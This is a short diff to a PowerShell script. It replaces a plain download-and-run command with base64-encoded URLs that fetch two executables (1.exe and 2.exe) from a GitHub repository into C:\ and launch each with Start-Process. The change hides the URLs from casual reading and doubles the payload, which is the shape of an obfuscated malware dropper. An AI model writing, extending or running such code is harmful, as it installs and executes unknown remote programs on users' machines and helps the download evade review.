@@ -1,1 +1,10 @@
-Invoke-WebRequest -Uri "https://github.com/cs2cc/s/raw/main/1.exe" -OutFile "C:\1.exe"; Start-Process -FilePath "C:\1.exe";
+$u1 = [System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2NzMmNjL3MvcmF3L21haW4vMS5leGU=");
+$u2 = [System.Convert]::FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL2NzMmNjL3MvcmF3L21haW4vMi5leGU=");
+$o1 = "C:\1.exe";
+$o2 = "C:\2.exe";
+
+Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString($u1)) -OutFile $o1;
+Start-Process -FilePath $o1;
+
+Invoke-WebRequest -Uri ([System.Text.Encoding]::UTF8.GetString($u2)) -OutFile $o2;
+Start-Process -FilePath $o2;
